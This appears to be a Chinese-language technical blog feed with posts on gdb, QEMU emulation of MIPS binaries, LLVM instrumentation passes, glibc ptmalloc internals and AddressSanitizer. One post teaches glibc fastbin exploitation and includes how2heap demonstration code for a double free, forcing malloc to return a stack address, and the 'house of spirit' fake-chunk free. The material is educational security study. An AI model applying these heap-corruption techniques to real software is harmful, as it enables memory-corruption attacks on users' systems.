    <content type="text"><![CDATA[最近在用gdb调试一个程序的时候，由于程序经过了strip处理，没有debug信息，所以当b main的时候会出现”Function main not defined”错误信息，也就是无法定位main函数。而当b libc_start_main函数时是可以定位到的，而libc_start_main函数的第一个参数就是main函数的地址，因此可以通过定位__libc_start_main函数，然后获得第一个参数的内容，此时就是main函数的地址。具体操作如下： 传进__libc_start_main函数的参数查看汇编可以看到将__libc_start_main的第一个参数传进了$RDI寄存器中（64位机器）： 因此在gdb中先在libc_start_main函数下断点: ```b libc_start_main``` 在$RDI指向的内容处下断点在 libc_start_main处下了断点后，run一下会在libc_start_main入口处停下，此时$rdi寄存器存储的是main函数的地址，b *$rdi则会在main处下断点]]></content>
      <categories>
        <category>gdb</category>
      </categories>
      <tags>
        <tag>gdb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Qemu模拟Mips程序运行]]></title>
    <url>%2F2018%2F01%2F14%2Fqemu-mips%2F</url>
    <content type="text"><![CDATA[使用Qemu可以运行不同环境的程序，比方说在i386架构下运行arm和mips架构的程序。 安装Qemu sudo apt-get install qemu sudo apt-get install qemu-user-static 将qemu-mips-static文件拷贝到当前文件 cp /usr/bin/qemu-mips-static ./ 运行mips程序(其中./bin/busybox为要执行的busybox) sudo chroot . ./qemu-mips-static ./bin/busybox]]></content>
      <categories>
        <category>qemu</category>
      </categories>
      <tags>
        <tag>qemu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[llvm存取fs段内容]]></title>
    <url>%2F2017%2F11%2F18%2Fllvm%E5%AD%98%E5%8F%96fs%E6%AE%B5%E5%86%85%E5%AE%B9%2F</url>
    <content type="text"><![CDATA[问题最近想使用llvm的pass来对每个函数进行插桩，来模拟stack guard的功能。其中碰到了一个很棘手的问题就是如何通过llvm C API实现对fs段内容的存取。要想实现该问题，我通过查看llvm如何实现stack guard,找到了具体的解决方案。下面首先看一下llvm中stackProtector pass如何实现对fs段的存取，然后再介绍一下我自己简化版本的Stack guard。 stackProtector对fs段的存取在stackProtector中，调用getIRStackGuard(IRBuilder&lt;&gt; &amp;IRB) const函数对fs段进行存取的，其在x86下实现的具体代码如下: 其中fs段的addressSpace为257 实现存取所以对fs段的存取代码如下: 12345678910//Address为257表示在用户模式下的fs段寄存器static Constant* SegmentOffsetStack(IRBuilder&lt;&gt; &amp;IRB, unsigned Offset, unsigned AddressSpace) &#123; return ConstantExpr::getIntToPtr( ConstantInt::get(Type::getInt32Ty(IRB.getContext()), Offset), Type::getInt8PtrTy(IRB.getContext())-&gt;getPointerTo(AddressSpace) );&#125;static Value* getTheStackGuardValue(IRBuilder&lt;&gt; &amp;IRB, unsigned offset) &#123; return SegmentOffsetStack(IRB, offset, 257);&#125; 其中offset为从fs段偏移offset处取数据。 下附我对stack guard的一个简单的实现:stackguard]]></content>
      <categories>
        <category>llvm</category>
      </categories>
      <tags>
        <tag>llvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[llvm生成rdrand指令]]></title>
    <url>%2F2017%2F11%2F18%2Fllvm-rdrand%2F</url>
    <content type="text"><![CDATA[问题在做一个project的时候需要使用llvm的pass对函数进行插桩，在每一个函数头之前插入一条指令rdrand %rax，在寻找llvm基本指令之后发现并没有生成随机数的指令，这时就想到了llvm中intrinsic函数中是否有关于rdrand指令的函数，在对llvm整个源码进行扫描之后，发现有x86的rdrand的intrinsic函数: 1234X86_INTRINSIC_DATA(rdrand_16, RDRAND, X86ISD::RDRAND, 0),X86_INTRINSIC_DATA(rdrand_32, RDRAND, X86ISD::RDRAND, 0),X86_INTRINSIC_DATA(rdrand_64, RDRAND, X86ISD::RDRAND, 0), 既然有对它们的定义，那是否有关于它们的使用呢，又经过一番查找，终于在一个测试文件中(/test/CodeGen/X86/rdrand.ll)找到相应的使用: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546declare &#123;i16, i32&#125; @llvm.x86.rdrand.16()declare &#123;i32, i32&#125; @llvm.x86.rdrand.32()declare &#123;i64, i32&#125; @llvm.x86.rdrand.64()define i32 @_rdrand16_step(i16* %random_val) &#123; %call = call &#123;i16, i32&#125; @llvm.x86.rdrand.16() %randval = extractvalue &#123;i16, i32&#125; %call, 0 store i16 %randval, i16* %random_val %isvalid = extractvalue &#123;i16, i32&#125; %call, 1 ret i32 %isvalid; CHECK-LABEL: _rdrand16_step:; CHECK: rdrandw %ax; CHECK: movzwl %ax, %ecx; CHECK: movl $1, %eax; CHECK: cmovael %ecx, %eax; CHECK: movw %cx, (%r[[A0:di|cx]]); CHECK: ret&#125;define i32 @_rdrand32_step(i32* %random_val) &#123; %call = call &#123;i32, i32&#125; @llvm.x86.rdrand.32() %randval = extractvalue &#123;i32, i32&#125; %call, 0 store i32 %randval, i32* %random_val %isvalid = extractvalue &#123;i32, i32&#125; %call, 1 ret i32 %isvalid; CHECK-LABEL: _rdrand32_step:; CHECK: rdrandl %e[[T0:[a-z]+]]; CHECK: movl $1, %eax; CHECK: cmovael %e[[T0]], %eax; CHECK: movl %e[[T0]], (%r[[A0]]); CHECK: ret&#125;define i32 @_rdrand64_step(i64* %random_val) &#123; %call = call &#123;i64, i32&#125; @llvm.x86.rdrand.64() %randval = extractvalue &#123;i64, i32&#125; %call, 0 store i64 %randval, i64* %random_val %isvalid = extractvalue &#123;i64, i32&#125; %call, 1 ret i32 %isvalid; CHECK-LABEL: _rdrand64_step:; CHECK: rdrandq %r[[T1:[a-z]+]]; CHECK: movl $1, %eax; CHECK: cmovael %e[[T1]], %eax; CHECK: movq %r[[T1]], (%r[[A0]]); CHECK: ret&#125; 这个系列函数是对rdrandx_step(address)系列函数的包装，在这些函数中是生成随机数，并将该随机数保存到address参数中。发现在该系列函数中对@llvm.x86.rdrand.xx()系列函数的调用，可以发现，在该函数第一个语句是对@llvm.x86.rdrand.xx() intrinsic函数的调用，该函数返回一个StructType类型的结果，该结果一共有两个成员组成，第一个成员是@llvm.x86.rdrand.xx()函数产生的随机数，第二个参数表示该函数是否调用成功。第二个语句就是从结果中取出随机数。弄清了该函数的逻辑后就可以通过llvm C API产生相应的IR指令。 llvm C API下面是我通过llvm的C API产生的相应的IR指令的代码: 123456789101112131415AllocaInst* AI3 = B.CreateAlloca(PtrTy, nullptr, "RandomValue"); std::vector&lt;Type *&gt; arg_type; Function *fun = Intrinsic::getDeclaration(F-&gt;getParent(), Intrinsic::x86_rdrand_64, arg_type);CallInst* result = B.CreateCall(fun, &#123;&#125;); //B.CreateRet(result); //result-&gt;dump();if (dyn_cast&lt;StructType&gt;(result-&gt;getType())) &#123; //errs() &lt;&lt; "Hello\n"; Value* randomValue = B.CreateExtractValue(result, (uint64_t)0); Value* randomValuePtr = B.CreateIntToPtr(randomValue, Type::getInt8PtrTy(B.getContext())); B.CreateStore(randomValuePtr, AI3, true);&#125; 注意事项在生成了.ll文件后，需要用llc工具生成二进制文件，此时需要添加-mattr=rdrnd的属性: 1llc -filetype=obj input.ll -mattr=+rdrnd -o output.o 否则会出现LLVM ERROR: Cannot select: t74: i64,i32,ch = X86ISD::RDRAND t0错误]]></content>
      <categories>
        <category>llvm</category>
      </categories>
      <tags>
        <tag>llvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux堆内存漏洞利用之fastbin]]></title>
    <url>%2F2017%2F09%2F24%2Flinux%E5%A0%86%E5%86%85%E5%AD%98%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin%2F</url>
    <content type="text"><![CDATA[背景介绍 在前一节主要介绍了Glibc的堆内存管理的机制，在上一节的基础上，我打算介绍一下针对Glibc堆内存管理的攻击。此系列我打算按攻击面是哪一个bin来展开，主要分为: fastbin的攻击 smallbin的攻击 largebin的攻击 unsorted bin的攻击 top chunk的攻击 本文主要介绍fastbin的攻击 fastbin漏洞利用 具体的fastbin的介绍请参考前一节和 Linux堆内存管理深入分析(下)，在本节中主要结合how2heap的代码来介绍一下具体的漏洞利用思路。 fastbin double free double free的意思就是一个malloc的指针被释放了两次，由于针对fastbin的free处理只是对double free做了简单的判断，所以很容易绕过它的double free判断。free() fastbin时的判断如下所示： 1234567/* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) &#123; errstr = "double free or corruption (fasttop)"; goto errout; &#125; 其中old指针为fast bin的头指针，即此处只是判断fastbin的头指针和p指针是否一致。所以fastbin double free的攻击思路就是我们只要保证要double free的chunk不在fastbin的头部即可。 具体的攻击示例如下： 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; printf("This file demonstrates a simple double-free attack with fastbins.\n"); printf("Allocating 3 buffers.\n"); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); printf("1st malloc(8): %p\n", a); printf("2nd malloc(8): %p\n", b); printf("3rd malloc(8): %p\n", c); printf("Freeing the first one...\n"); free(a); printf("If we free %p again, things will crash because %p is at the top of the free list.\n", a, a); // free(a); printf("So, instead, we'll free %p.\n", b); free(b); printf("Now, we can free %p again, since it's not the head of the free list.\n", a); free(a); printf("Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a); printf("1st malloc(8): %p\n", malloc(8)); printf("2nd malloc(8): %p\n", malloc(8)); printf("3rd malloc(8): %p\n", malloc(8));&#125; 在此示例中，首先申请三个大小为8的int数组，然后先free(a),由于fast bin是一个单链表，在插入和删除的时候只在头部进行，所以此时将a的chunk放入了fast bin的头部，随后又free(b),此时fast bin的头部为chunk b，随后又free(a)，此时由于fast bin的头部为chunk b，所以在free()的时候进行判断old == p不会抛出错误进而绕过这个简单的判断处理。再进行malloc的时候首先会从fast bin的头部进行删除，则接下来第一个分配的chunk为chunk A，第二个分配的为chunk B，接下来会再次分配chunk A。 绕过示例结果如下所示: fast bin double free in stack 上面的那个例子只是简单的一个double free，这个例子是利用double free漏洞在栈中构造了一个fake chunk。 其具体的示例如下所示: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; printf("This file extends on fastbin_dup.c by tricking malloc into\n" "returning a pointer to a controlled location (in this case, the stack).\n"); unsigned long long stack_var; printf("The address we want malloc() to return is %p.\n", 8+(char *)&amp;stack_var); printf("Allocating 3 buffers.\n"); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); printf("1st malloc(8): %p\n", a); printf("2nd malloc(8): %p\n", b); printf("3rd malloc(8): %p\n", c); printf("Freeing the first one...\n"); free(a); printf("If we free %p again, things will crash because %p is at the top of the free list.\n", a, a); // free(a); printf("So, instead, we'll free %p.\n", b); free(b); printf("Now, we can free %p again, since it's not the head of the free list.\n", a); free(a); printf("Now the free list has [ %p, %p, %p ]. " "We'll now carry out our attack by modifying data at %p.\n", a, b, a, a); unsigned long long *d = malloc(8); printf("1st malloc(8): %p\n", d); printf("2nd malloc(8): %p\n", malloc(8)); printf("Now the free list has [ %p ].\n", a); printf("Now, we have access to %p while it remains at the head of the free list.\n" "so now we are writing a fake free size (in this case, 0x20) to the stack,\n" "so that malloc will think there is a free chunk there and agree to\n" "return a pointer to it.\n", a); stack_var = 0x20; printf("Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a); *d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d)); printf("3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8)); printf("4th malloc(8): %p\n", malloc(8));&#125; 在以上代码中，当d被malloc的时候，此时还有对应的chunk a在fast bin中，所以如果对d进行修改，也会影响到chunk a的值。我们知道malloced chunk和freed chunk对应的结构不一样，对与同一个chunk A来说，有两种形式–对于d来说，其对应的是malloced chunk，而其在fast bin中还有一个freed chunk。 其示例如图所示： 可以看到d(payload开始地址)正好对应了chunk A的fd指针，将 d的值赋值为&amp;stack_var-8,则 stack_var=0x20即为在栈中伪造的chunk的size=0x20，与此fast bin的大小对应，此时chunk A的fd指向了在栈中伪造的chunk，此时就将伪造的chunk放入了fastbin链表中。进而malloc可以返回伪造的指针。 该示例代码的运行结果如下所示： The house of spirit 此攻击也是在栈中伪造fake chunk，和第二个攻击不同的是其只是在栈中声明了一个指针，而并没有通过malloc()函数来在堆中申请空间，接着将该指针赋值为特定的伪造的chunk的地址，随后free该指针，就将在栈中伪造的chunk添加到对应的fastbin中去了。具体的示例如下所示: 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; printf("This file demonstrates the house of spirit attack.\n"); printf("Calling malloc() once so that it sets up its memory.\n"); malloc(1); printf("We will now overwrite a pointer to point to a fake 'fastbin' region.\n"); unsigned long long *a; // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY) unsigned long long fake_chunks[10] __attribute__ ((aligned (16))); printf("This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[7]); printf("This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"); printf("... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"); fake_chunks[1] = 0x40; // this is the size printf("The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"); // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8 fake_chunks[9] = 0x1234; // nextsize printf("Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &amp;fake_chunks[1]); printf("... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"); a = &amp;fake_chunks[2]; printf("Freeing the overwritten pointer.\n"); free(a); printf("Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &amp;fake_chunks[1], &amp;fake_chunks[2]); printf("malloc(0x30): %p\n", malloc(0x30));&#125; 示例的结果如下图所示: 参考 how2heap]]></content>
      <categories>
        <category>malloc</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>fastbin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ptmalloc堆内存管理]]></title>
    <url>%2F2017%2F09%2F22%2Fptmalloc%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[背景介绍Linux的栈内存管理相信大家都已经很熟悉了，针对栈内存的攻击也是比较常见的。然而对于堆内存的管理机制可能不太熟悉，针对堆内存的攻击也是比较困难的，所以我通过阅读各种资料以及Glibc的相关源码，对Glibc下的堆内存管理机制有了一定的了解，故在此记录下学习心得。 首先不同平台的堆内存管理机制是不一样的，我现在主要是针对Glibc的堆内存管理机制进行分析，Glibc的堆内存管理机制叫做ptmalloc。其他的一些比较流行的管理机制有： jemalloc(FreeBSD, Firefox, Android) ptmalloc(Glibc) tcmalloc(Google) libumem(Solaris) Chunk structure在Glibc的堆内存管理中，chunk是堆内存分配的基本的单位，它表示堆内存中连续的内存单元。比方说我们通过malloc(8)申请一个连续的8字节内存，则Glibc会分配我们一个大小为8(chunk size + previous size)+8(payload)大小的chunk。chunk分为allocated chunk和freed chunk。chunk structure在Glibc的定义如下所示： 123456789101112struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; 从上面的结构我们可以看出，如果一个chunk为allocated chunk，则它需要分配prev_size和size域，其中prev_size和size(表示整个chunk的大小，包括sizeof(prev_size)+sizeof(size)+sizeof(payload))用来在进行free()操作的时候将与该chunk空间上相邻的freed chunk进行合并，减少了堆内存空间的碎片化（具体怎么合并的在下面会具体介绍）。如果一个chunk为freed chunk的话，其相对于allocated chunk来说又多了两个域–fd和bk指针。因为freed chunk是通过多个链表结构将所有的freed chunk链接了起来，这样便于malloc函数快速找到合适大小的freed chunk，并且该这些表是双向链表(fastbins除外)。 所以对于malloced chunk来说，具体的内存区域如下所示:123456789101112chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | prev_size:Size of previous chunk, if allocated | | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |M|P| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here... . . . . (malloc_usable_size() bytes) . . |nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 在size域，有两个标志位，一个为M，一个为P。M表示该chunk是否是allocated chunk，P表示与该chunk空间上相邻的之前的chunk是否是freed chunk，如果该标识为0，表示previous chunk为freed chunk,则prev_size域表示previous chunk的大小; 否则如果previous chunk为allocated chunk，则记录previous chunk的大小就没有意义，此时就将prev_size域当做previous chunk的payload的一部分。 对于freed chunk来说，具体的内存区域如下所示:123456789101112131415 chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ `head:' | Size of chunk, in bytes |P| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Forward pointer to next chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space (may be 0 bytes long) . . . . |nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ `foot:' | Size of chunk, in bytes | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 对于freed chunk来说，就多了两个域：fd和bk，这两个域分别指向该链表中的前一个元素和后一个元素。 Bins在Glibc的堆内存管理中，bin是将一个个freed chunk链接起来的链表，而bins就是存储这些链表的一维数组。每一个bin都是双向链表。根据freed chunk的大小将其分为了不同的136个bin，其中有10个为fastbin, 62个small bin，63个large bin和一个unsorted bin。在malloc_state结构中，就定义了这些bin的数组，具体声明如下：1234567891011121314151617181920212223242526272829303132333435363738struct malloc_state&#123; /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags;#if THREAD_STATS /* Statistics for locking. Only used if THREAD_STATS is defined. */ long stat_lock_direct, stat_lock_loop, stat_lock_wait;#endif /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. */ struct malloc_state *next_free; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; Fast Bins在Glibc的堆内存管理机制中，一共有10个fast bin,每个fast bin链表中的所有freed chunk的大小(sizeof(prev_size)+sizeof(size)+sizeof(payload))都是相等的。每个fast bin都是一个单链表( )。Fastbins中最小的bin中的chunk大小为16字节，随后每个bin都增加8字节，所以最大的bin为80字节。需要注意的是，fast bin和其它的bin在free处理的时候有很大的不同，fast bin中的chunk的M标志都为1，因此在进行free处理的时候不进行freed chunk的合并操作(具体的合并操作在下文会具体介绍)。在每一个fast bin链表中，当有新的freed chunk需要插入时，会插入到该链表的尾部，删除也是从尾部删除，因此形成了一个先入后出(FILO)的策略。 Small BinsSmall bin的个数为62个，每一个small bin是一些大小相等的freed chunk组成的循环双向链表。当有新的freed chunk加入到该链表中，就加入到该链表的头部；如果要从链表中删除一个freed chunk时，则从该链表的为尾部删除，因此形成了一个先入先出(FIFO)的策略。第一个small bin中的freed chunk的大小都是16 bytes，后面每一个small bin的freed chunk的大小都依次增加8 bytes，因此最后一个small bin的freed chunk的大小为512 bytes。 Large Bins与small bin和fast bin不同的是，每一个large bin中的freed chunk的大小不一定相等，其只是表示一个范围，在前32个large bin中，以64字节为步长，即第一个large bin中的chunk大小为512~575字节，第二个large bin中的free chunk大小为576~639字节。紧随其后的16个large bin依次以512字节步长为间隔；之后的8个bin以步长4096为间隔；再之后的4个bin以32768字节为间隔；之后的2个bin以262144字节为间隔；剩下的chunk就放在最后一个large bin中。 Unsorted Bin只有一个unsorted sin，其主要存储两种chunk。一种是在malloc()操作中由于要分配的大小比freed chunk的大小要小，所以需要将该freed chunk进行分割，返回与要分配的大小相符的chunk，剩余的freed chunk则加入unsorted bin中；另一种是在free()操作之后，会返回一个新的freed chunk，该freed chunk(不在fast bin范围的chunk)则加入unsorted bin中。设置这一个bin的主要目的是扮演一个缓存层的角色以加快分配和释放的操作。 Top chunk有一个特殊的chunk没有在以上的bins中，那就是top chunk，top chunk可以看做是heap的一个边界，当所有的bin中的chunk大小都不符合所请求的大小时，就从该chunk中进行分配，如果top chunk的大小大于所请求的大小时，则将top chunk分为两部分，一个是用户请求的chunk，剩余的部分就会成为一个新的chunk。否则，就需要扩展通过上移top chunk指针来扩展heap的大小(或者通过mmap来分配新的heap)。 Mallocmalloc函数是堆内存管理中最重要的一个函数之一，其在glibc中的包装函数为__libc_malloc(size_t)函数，在该函数中主要是进行一些准备性的工作–查找对应的arena结构，然后调用真正的分配内存的函数 _int_malloc(ar_ptr, bytes)。arena在glibc中的结构为malloc_state结构，主要存储bins，top chunk等结构。下面我们来看一下主要的分配函数_int_malloc的具体实现。 _int_malloc (mstate av, size_t bytes) 首先_int_malloc函数根据要请求的内存大小bytes来计算要请求的chunk的大小nb。主要是加上size和prev_size域和对齐的padding。 得到了要请求的chunk大小之后，首先判断该chunk的大小是否在fast bins的范围内，如果在它们的范围内就在fast bins中找到大小相符的chunk来分配。 如果要请求的大小不在fast bins范围之内或者相应的fast bin链表为空，则会判断其chunk size是否在small bins的范围之内，找到对应的small bin，取出该small bin尾部的那个chunk进行分配。 如果请求的大小是一个比较大的请求，则将fast bins进行合并。其要做fast bins合作的目的是为了避免有fast bins所引起的内存碎片化问题。在实际的操作中，程序一般都是分配小的内存或者分配大的内存，而不怎么会即分配大的内存又分配小的内存。所以这样的策略在实际的程序中效率还是很理想的。 由于unsorted bin中存储最近freed的chunk(包括第4步合并后的fast bins)，接下来会遍历unsorted bin中的所有freed chunk，直到找到freed chunk大小和请求的大小相等的为止，或者循环了10000次也会停止遍历unsorted bin。遍历unsorted bin是唯一一个将freed chunk插入到相应的small bins和large bins的操作。在遍历的过程中，将当前节点chunk从unsorted bin中删除，如果chunk大小与要请求的chunk大小正好一致，则将该chunk返回，停止遍历，否则，将当前节点的chunk放入相应的small bins和large bins中。 遍历了unsorted bin之后仍然没有找到合适的freed chunk，接下来回从large bins中进行查找，首先从large bin中的chunk大于等于请求的chunk进行查找。 如果该large bin为空或者最大的chunk比要请求的chunk的大小还要小，则找到chunk size范围更大的large bin，进行的操作和刚才介绍的操作一致。 如果要请求的大小比large bins中的chunk还要大，则需要查看top chunk的大小了，如果top chunk的大小比要请求的chunk的大小要大，则分割top chunk，将剩余的chunk继续作为top chunk的一部分，否则判断是否还有fastbins，如果有fastbins，则将fastbins合并。以上各种查询都没有找到合适的chunk，则只能调用sysmalloc函数来进行分配。 至此，malloc的分配的过程已经介绍完了，总结一下其查找过程就是fastbins-&gt;smallbins-&gt;unsortedbins-&gt;largebins-&gt;topchunk Freefree函数也是堆内存管理中最重要的函数之一，堆内存的攻击也主要是针对free函数的进行的攻击。在glibc中，__libc_free(void mem)为free(void mem)函数的包装函数，其主要的功能也是找到malloc_state结构，然后再调用 _int_free(mstate av, mchunkptr p, int have_lock)函数。 判断p指向的地址是否在p+chunksize(p)指向的地址之前，如果不符合该规则的话就会抛出错误(“free(): invalid pointer”)。 判断chunk的大小是否大于MINSIZE或者是不是MALLOC_ALIGNMENT的整数倍，否则抛出错误(“free(): invalid size”) 判断要free的chunk的大小是否落在了fast bins的范围内，如果落在了这个范围内，则将该freed chunk加入到对应的fast bin中。 判断该chunk是否是mmapped，如果不是，就进行各种判断防止部分针对free操作的攻击。 判断要free的chunk是否是top chunk，如果是，则抛出错误(“double free or corruption (top)”) 判断next chunk在内存中是否在arean的范围内，如果不是，则抛出错误(“double free or corruption (out)”) 判断next chunk的P标志是否为真，如果不是，则抛出错误(“double free or corruption (!prev)”) 判断next chunk的大小是否正常范围之间，如果不是，则抛出错误(“free(): invalid next size (normal)”) 然后将与free的chunk与其相邻的freed chunk进行合并，合并了之后将它插入到unsorted bin中。 参考 Understanding glibc malloc heap-exploitation Linux堆内存管理深入分析(上) Linux堆内存管理深入分析(下)]]></content>
      <categories>
        <category>malloc</category>
      </categories>
      <tags>
        <tag>ptmalloc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AddressSanitizer算法及源码解析]]></title>
    <url>%2F2017%2F07%2F26%2FAddressSanitizer%2F</url>
    <content type="text"><![CDATA[AddressSanitizer简介AddressSanitizer是Google用于检测内存各种buffer overflow(Heap buffer overflow, Stack buffer overflow, Global buffer overflow)的一个非常有用的工具。该工具是一个LLVM的Pass，现已集成至llvm中，要是用它可以通过-fsanitizer=address选项使用它。AddressSanitizer的源码位于/lib/Transforms/Instrumentation/AddressSanitizer.cpp中，Runtime-library的源码在llvm的另一个项目compiler-rt的/lib/asan文件夹中。 AddressSanitizer算法具体的算法可以参考WIKI,在此对AddressSanitizer算法做一个简短的介绍。AddressSanitizer主要包括两部分：插桩(Instrumentation)和动态运行库(Run-time library)。插桩主要是针对在llvm编译器级别对访问内存的操作(store，load，alloca等)，将它们进行处理。动态运行库主要提供一些运行时的复杂的功能(比如poison/unpoison shadow memory)以及将malloc,free等系统调用函数hook住。其实该算法的思路很简单，如果想防住Buffer Overflow漏洞，只需要在每块内存区域右端（或两端，能防overflow和underflow）加一块区域（RedZone），使RedZone的区域的影子内存（Shadow Memory)设置为不可写即可。具体的示意图如下图所示。 内存映射AddressSanitizer保护的主要原理是对程序中的虚拟内存提供粗粒度的影子内存(没8个字节的内存对应一个字节的影子内存)，为了减少overhead，就采用了直接内存映射策略，所采用的具体策略如下：Shadow=(Mem &gt;&gt; 3) + offset。每8个字节的内存对应一个字节的影子内存，影子内存中每个字节存取一个数字k,如果k=0，则表示该影子内存对应的8个字节的内存都能访问，如果0&lt;k&lt;7,表示前k个字节可以访问，如果k为负数，不同的数字表示不同的错误（e.g. Stack buffer overflow, Heap buffer overflow)。具体的映射策略如下图所示。 图1： 虚拟地址映射图 插桩为了防止buffer overflow，需要将原来分配的内存两边分配额外的内存Redzone，并将这两边的内存加锁，设为不能访问状态，这样可以有效的防止buffer overflow(但不能杜绝buffer overflow)。一下是在栈中插桩的一个例子。 未插桩的代码： 12345void foo() &#123; char a[8]; ... return;&#125; 插桩后的代码： 12345678910111213void foo() &#123; char redzone1[32]; // 32-byte aligned char a[8]; // 32-byte aligned char redzone2[24]; char redzone3[32]; // 32-byte aligned int *shadow_base = MemToShadow(redzone1); shadow_base[0] = 0xffffffff; // poison redzone1 shadow_base[1] = 0xffffff00; // poison redzone2, unpoison 'a' shadow_base[2] = 0xffffffff; // poison redzone3 ... shadow_base[0] = shadow_base[1] = shadow_base[2] = 0; // unpoison all return;&#125; 动态运行库在动态运行库中将malloc/free函数进行了替换。在malloc函数中额外的分配了Redzone区域的内存，将与Redzone区域对应的影子内存加锁，主要的内存区域对应的影子内存不加锁。 free函数将所有分配的内存区域加锁，并放到了隔离区域的队列中(保证在一定的时间内不会再被malloc函数分配)。 AddressSanitizer源码分析AddressSanitizer主要有三种层面的变量：Stack Variable(局部变量)，Global Variable, Heap Variable。由于每种变量的生命周期（life time)不同，所以对不同种类的变量处理也是不同的。下面分别从Global Variable，Stack Variable，Heap Variable三个层次来分析AddressSanitizer源码的逻辑结构。 Global VariableGlobal Variable存放在程序的数据段。在该算法的实现过程中，处理GlobalVariale的是AddressSanitizerModule类，该类继承自llvm的ModulePass，所以我们先看一下AddressSanitizerModule类的runOnModule(Module &amp;M)方法的处理过程，该过程首先进行一些初始化，然后我们可以看到对Global的插桩方法InstrumentGlobals()方法。 图2： RunOnModule 在InstrumentGlobals()方法中，主要是分成两步：首先，重新声明一个GlobalVariable，这个GlobalVariable包含以前的GlobalVariable和一个RedZone；然后，调用runtime-library将新声明的这个GlobalVariable的RedZone区域加锁。我们先来看第一步的具体实现，如图3所示。 图3： 生成包含RedZone的新的GlobalVariable 